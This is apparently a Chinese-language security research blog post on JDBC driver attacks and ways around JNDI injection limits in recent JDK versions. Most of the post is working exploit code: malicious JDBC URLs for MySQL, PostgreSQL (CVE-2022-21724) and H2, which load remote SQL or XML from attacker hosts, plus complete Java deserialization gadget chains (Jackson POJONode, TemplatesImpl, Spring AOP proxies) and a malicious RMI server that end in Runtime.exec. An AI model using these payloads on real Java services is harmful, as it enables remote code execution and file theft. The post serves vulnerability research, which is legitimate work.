---
slug: tiangongarticle040
date: 2024-07-24
title: JDBC Attack 与高版本 JDK 下的 JNDI Bypass
author: crumbledwall
tags: [Java, JDBC, JNDI]
---

# JDBC Attack 与高版本 JDK 下的 JNDI Bypass

## 一、前言

JNDI 注入作为 Java 攻击的常见 Sink 点，通常被用于 Weblogic 以及 Fastjson 等常见目标的攻击流程中，而 JNDI 注入的利用经过 JDK 新版本对相关利用的修复，以及一些常见依赖利用方式的变化，在高版本 JDK 中，其利用逐渐遭遇了困境。而 JDBC Attack，作为针对 Java 数据库引擎的一种攻击方式，除了其常规的利用方式之外，也可以与原生反序列化结合起来，实现对 JNDI 攻击的扩展，解决高版本下 JNDI 注入的困境。

<!-- truncate -->

## 二、关于 JDBC Attack

 ![](/attachments/2024-07-24-jdbc-attack-jndi-bypass/e84fd309-622b-4a63-b11c-d74bf141c4a5.gif)

首先是关于基础的JDBC Attack的一些回顾，JDBC 是Java应用在连接不同的底层数据库引擎时使用的抽象层，使得Java应用可以用相同的接口对各种不同的数据库进行抽象的控制，JDBC使用如下的URL格式进行连接。

```java
Class.forName("com.mysql.cj.jdbc.Driver");
String url = "jdbc:mysql://mysql.db.server:3306/my_database?useSSL=false&serverTimezone=UTC"
Connection conn = DriverManager.getConnection(url)
```

而该URL中，后面的可控参数就是针对不同数据库Driver进行利用的入口。

接下来我们来回顾一下常见的几个 Driver 的利用：

### 2.1 MySQL Driver

针对MySQL Driver的通用利用主要是使用 Fake Server 进行任意文件读，首先需要配置 MySQL fake server，然后开启 allowLoadLocalInfile=true 设置，构造形如  jdbc:mysql://evil-ip:3306/test?allowLoadLocalInfile=true 的 URL 去请求 fake server 即可进行利用。

对于 MySQL 也可以打反序列化，但是有版本限制，只有较老的 \<= 8.0.20, \< 5.1.49 的版本可以利用，可以配置不同的 URL 参数来开启反序列化的利用，下表是节选自《Make JDBC attack brilliant again》议题的具体利用 URL 参数。

 ![](/attachments/2024-07-24-jdbc-attack-jndi-bypass/069bd3d5-f2e6-413c-a8c3-ca5ed4081c17.png)

### 2.2 PostgreSQL

pgsql 的利用则是22年爆的一个洞，即 CVE-2022-21724，影响版本为 9.4.1208 \<= PgJDBC \< 42.2.25 与 42.3.0 \<= PgJDBC \< 42.3.2。

这个洞可以利用 `socketFactory` 和 `socketFactoryArg` 来传入一个类并实例化，然后其构造参数是可控的，我们可以寻找到 spring 框架中的如下两个类来进行利用。

```java
org.springframework.context.support.ClassPathXmlApplicationContext
org.springframework.context.support.FileSystemXmlApplicationContext
```

构造形如 `jdbc:postgresql://node/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://127.0.0.1/test.xml` 的payload 来引入恶意的 `xml` 文件进行利用。

`xml` 文件的内容如下：

```xml
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
            <list>
                <value>open</value>
                <value>-a</value>
                <value>Calculator</value>
            </list>
        </constructor-arg>
    </bean>
</beans>
```

### 2.3 Spring Boot H2

H2 driver 的利用攻击面比较广，可以分别来分析一下。

#### javac

首先对于包含 javac 的环境，即包含 jdk 的环境，可以直接构造 Java 语句进行 RCE。

网上流传的 Poc 为：

```java
jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8000/poc.sql'
```

poc.sql 的内容为：

```sql
CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return "1";}';CALL EXEC ('calc.exe')
```

这里通过 init 来执行语句，其只允许执行一条 sql 语句，所以网上的思路都是加载外部 sql 文件来执行，需要出网的条件。

不过这里有个 trick，实际上多进行几次转义，这里的 init 可以塞进两条语句，如下所示，实际上不出网也可以实现利用。

```java
jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;return \"1\"\\;}'\\;CALL EXEC ('calc')
```

#### Nashorn JavaScript

其次，对于没有 javac 环境的目标，通常可以使用 javascript 引擎来攻击，不过对于 Nashorn JavaScript 引擎，其在 jdk 15 之后被移除了，因此只适用于低于15版本的利用。

利用的 payload 如下：

```java
String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER hhhh BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec(\"calc.exe\")\n$$\n";
```

#### Groovy

除了 JavaScript 引擎之外，还可以使用 Groovy 脚本引擎来利用，不过 Groovy 依赖相对少见一些，能利用的目标较少。

利用的 payload 如下：

```java
String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS '@groovy.transform.ASTTest(value={ assert java.lang.Runtime.getRuntime().exec(\"open -a Calculator\")})def x'";
```

## 三、关于 JNDI 注入

### 3.1 JNDI 注入的现状

对于 JNDI 注入，首先一个基本的认知是，在 8u191 之后，高版本 JDK codebase 为 true，因此客户端默认不会请求远程 Server上的恶意 Class，因此在存在 JNDI 注入的情况下，也无法直接加载 Class 来 RCE。

然后针对这个问题，有两种常见的绕过方式，分别是服务端返回序列化 Payload，触发客户端的本地 Gadget；以及构造返回的 Reference 对象，将其指向我们本地 classpath 中存在的类，并通过寻找合适的 Factory 类来构造 Payload 实现 RCE。

后者有一种常见的思路是利用 `org.apache.naming.factory.BeanFactory` 这个类来实现利用。其 getObjectInstance 方法可以反射实例化 Reference 所指向的任意 Bean Class，并且会调用 setter 方法为所有的属性赋值，而它有一个 forceString 参数，可以将任意一个方法指定成一个 setter，那么在这些参数都可控的情况下，我们就有了一个任意静态方法调用，那么就可以在使用 tomcat 8 之后都携带的 `javax.el.ELProcessor` 来 RCE，这个也叫做 Tomcat Bypass。

但是去年有一天在实战中发现这个打不通了，搜报错搜了半天网上也没啥文章说这事。后来搜到了官方的一个 [Bug Report](https://bz.apache.org/bugzilla/show_bug.cgi?id=65736)，然后发现经过一番讨论之后 forceString 这个特性已经被删了：

 ![](/attachments/2024-07-24-jdbc-attack-jndi-bypass/ebff1232-68c9-4ddd-8e2e-447a1b5c7727.png)

 ![](/attachments/2024-07-24-jdbc-attack-jndi-bypass/c32b12d1-b9ce-421b-981b-a3dd28a6af1b.png)

也就是说最常见的 codebase bypass 方法已经无法利用了，在较新的 Tomcat 或者 Spring Boot 环境里基本上只能考虑触发客户端本地 Gadget 的方法了。

### 3.2 JNDI 注入的 Spring 环境利用

而去年阿里云 CTF 中，一个新的 Jackson 反序列化链的利用被提了出来，而 Jackson 是 spring boot 都会默认包含的依赖，也就是说 JNDI 的客户端是 Spring Boot，就都可以考虑打这条 Gadget。

这条链主要利用了 Jackson 的一个特性，那就是 Jackson 里的 POJONode 类有着跟 Fastjson 的 JSONObject 类差不多的性质，在 toString 时会触发对象类中的 getter 方法，那么也就可以用打 Fastjson 常用的 TemplatesImpl 的 getOutputProperties 链。

但是这条链有一个问题，在 Jackson 依次触发 getter 时，其获取所有 getter 的顺序是使用 java 的 getDeclaredMethods 方法，而根据 Java 官方文档，这个方法获取的顺序是不确定的，如果获取到非预期的 getter 就会直接报错退出了。

 ![](/attachments/2024-07-24-jdbc-attack-jndi-bypass/f39fe342-f835-47b6-8704-f2565bea1529.png)

因此常常会出现有时打通有时打不通的情况，所以后来又对这条链进行了一些改进，这里可以使用 Spring Boot 里一个代理工具类进行封装，使 Jackson 只获取到我们需要的 getter，就实现了稳定利用。

```java
AdvisedSupport advisedSupport = new AdvisedSupport();
advisedSupport.setTarget(templates);
Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy"). getConstructor(AdvisedSupport.class);
constructor.setAccessible(true);
InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),  new Class[]{Templates.class}, handler);
```

最终可以构造出如下 payload，即可在 spring boot 环境下实现通杀的效果，虽然相比之前经典的 tomcat bypass 鸡肋的许多，但总算有了新的进展。

```java
CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
ctClass.removeMethod(writeReplace);
ctClass.toClass();

ClassPool pool = ClassPool.getDefault();
pool.insertClassPath(new ClassClassPath(Class.forName("com.sun.org.apache. xalan.internal. xsltc.runtime.AbstractTranslet")));
CtClass cc = pool.makeClass("Evil");
cc.makeClassInitializer().insertBefore("Runtime.getRuntime().exec(\"calc\");");
String randomClassName = "Evil" + System.nanoTime();
cc.setName(randomClassName);
cc.setSuperclass(pool.get("com.sun.org.apache.xalan.internal. xsltc.runtime.AbstractTranslet"));
byte[] classBytes = cc.toBytecode();
byte[][] targetByteCodes = new byte[][]{classBytes};

Object templates = Class.forName("com.sun.org.apache.xalan.internal.xsltc. trax.TemplatesImpl").getConstructor(new Class[]{}).newInstance();
Field fieldByteCodes = templates.getClass().getDeclaredField("_bytecodes");
fieldByteCodes.setAccessible(true);
fieldByteCodes.set(templates, targetByteCodes);

Field fieldName = templates.getClass().getDeclaredField("_name");
fieldName.setAccessible(true);
fieldName.set(templates, "crumbledwall");

fieldName = templates.getClass().getDeclaredField("_tfactory");
fieldName.setAccessible(true);
fieldName.set(templates, Class.forName("com.sun.org.apache.xalan. internal.xsltc.trax. TransformerFactoryImpl").newInstance());

AdvisedSupport advisedSupport = new AdvisedSupport();
advisedSupport.setTarget(templates);
Constructor constructor = Class.forName("org.springframework.aop. framework.JdkDynamicAopProxy"). getConstructor(AdvisedSupport.class);
constructor.setAccessible(true);
InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),  new Class[] {Templates.class}, handler);

POJONode pojoNode = new POJONode(proxy);

BadAttributeValueExpException badAttributeValueExpException  = new BadAttributeValueExpException (null);
fieldName = badAttributeValueExpException.getClass().getDeclaredField("val");
fieldName.setAccessible(true);
fieldName.set(badAttributeValueExpException, pojoNode);

ByteArrayOutputStream baos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(baos);
oos.writeObject(badAttributeValueExpException);
```

## 四、使用 JDBC Attack 扩展 JNDI 注入攻击面

上面的利用方式可以对于 Spring Boot 差不多进行通杀，但是还有一个问题是 TemplatesImpl 在最新的高版本 JDK 里是用不了的，那么圈子又兜回去了，对于高版本的 JDK 我们也需要一种可用的攻击手法才行。

这时候就可以考虑通过 JDBC Attack 来实现，我们回顾刚才的链，jackson 的链可以触发任意 getter，而 JDBC 中 getConnection 是 JDBC Attack 的触发点，那么就可以将 JDBC 与原生反序列化结合起来，先打 Jackson 链，然后去触发后续的 JDBC Attack。

### 4.1 Postgresql

这里首先我们通过 jackson 来触发 getter 的利用，然后创建一个 pgsql 的 datasource，把恶意的 url 塞进其中，就可以进行 getter 的后利用，就可以实现无 TemplatesImpl 的 RCE。

```java
CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind. node.BaseJsonNode");
CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
ctClass.removeMethod(writeReplace);
ctClass.toClass();

CtClass ctClass1 = ClassPool.getDefault().get("org.postgresql .ds.common.BaseDataSource");
CtMethod writeReplace1 = ctClass1.getDeclaredMethod("getURL");
ctClass1.removeMethod(writeReplace1);
ctClass1.toClass();

String command = "jdbc:postgresql://node/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://127.0.0.1:2333/test.xml";
PGSimpleDataSource dataSource = new PGSimpleDataSource();
dataSource.setURL(command);

AdvisedSupport advisedSupport = new AdvisedSupport();
advisedSupport.setTarget(dataSource);
Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
constructor.setAccessible(true);
InvocationHandler handler = (InvocationHandler) constructor .newInstance(advisedSupport);
Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{DataSource.class}, handler);

POJONode pojoNode = new POJONode(proxy);

HotSwappableTargetSource hotSwappableTargetSource1 =  new HotSwappableTargetSource(pojoNode);
HotSwappableTargetSource hotSwappableTargetSource2 =  new HotSwappableTargetSource(new XString(null));
HashMap exp = makeMap(hotSwappableTargetSource1, hotSwappableTargetSource2);

ByteArrayOutputStream baos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(baos);
oos.writeObject(exp);
```

对于 PgSQL 使用 Jackson 链时，会遇到一个如下的报错：

 ![](/attachments/2024-07-24-jdbc-attack-jndi-bypass/aac2f60a-7994-4b35-8667-bdcfd3edba5b.png)

这是因为 Jackson 在处理 getter 时不区分大小写，将 PgSQL 的两个 getter 识别为冲突，为了解决这个问题，我们同样可以使用 aop 代理的方法，套一层 DataSource 的接口类来解决，即 Payload 的该部分。

```java
AdvisedSupport advisedSupport = new AdvisedSupport();
advisedSupport.setTarget(dataSource);
Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
constructor.setAccessible(true);
InvocationHandler handler = (InvocationHandler)  constructor.newInstance(advisedSupport);
Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{DataSource.class}, handler);
```

同时，这里使用的 HotSwappableTargetSource 与 XString 的利用，也是由于高版本 JDK 不支持 BadAttributeValueExpException 而做出的替换，该利用是可以在高版本 JDK 直接使用的。

### 4.2 Dbcp H2

对于 Dbcp H2 我们可以进行如下利用，将 Jackson 链中 POJONode 的参数的 dataSource 替换为如下代码：

```java
String command = "rmi://127.0.0.1:1099/Exploit";
SharedPoolDataSource dataSource = new SharedPoolDataSource();
dataSource.setDataSourceName(command);
```

同时构造如下的高版本 JDK 可用的 rmi server，并将其设置为 dataSource 的 URL 来进行请求。

```java
Registry registry = LocateRegistry.createRegistry(rmi_port);
ResourceRef ref = new ResourceRef(
        "javax.sql.DataSource",
        null,
        "", "", true,
        "org.apache.commons.dbcp2.BasicDataSourceFactory",
        null);
String JDBC_URL = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
        "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
        "java.lang.Runtime.getRuntime().exec('open -a Calculator')\n" +
        "$$\n";
ref.add(new StringRefAddr("driverClassName","org.h2.Driver"));
ref.add(new StringRefAddr("url",JDBC_URL));
ref.add(new StringRefAddr("username","root"));
ref.add(new StringRefAddr("password","password"));
ref.add(new StringRefAddr("initialSize","1"));
```

### 4.3 C3p0 H2

对于 C3p0 H2，我们可以进行如下利用，最终也是落脚到 JavaScript 引擎的命令执行，我们同样需要将 Jackson 链中 POJONode 的参数的 dataSource 替换为如下代码：

```java
String command = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
        "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
        "java.lang.Runtime.getRuntime().exec('open -a Calculator')\n" +
        "$$\n";
ComboPooledDataSource dataSource = new ComboPooledDataSource();
dataSource.setJdbcUrl(command);
```

## 五、总结

本文首先回顾了基础的 JDBC 与 JDBC Attack 利用，然后分析了高版本 JDK 下 JNDI 注入遇到的困境与可行的解决方案，最后探讨了了使用 JDBC Attack 与原生反序列化结合来扩充高版本 JDK 下 JNDI 注入的思路。

在高版本 JDK 的 JNDI 注入中，我们无法像低版本的 JDK 一样直接进行利用，需要寻找目标本地依赖的攻击面，根据不同的目标进行具体的利用，JDBC 中的 getter 利用是可行的选择之一。

## 六、参考链接

1. [Make JDBC Attacks Brilliant Again 番外篇](https://tttang.com/archive/1462/)
2. [Deserial Sink With JDBC](https://github.com/luelueking/Deserial_Sink_With_JDBC)
3. [Make JDBC Attack Brilliant Again](https://conference.hitb.org/files/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&%20Chen%20Hongkun.pdf)
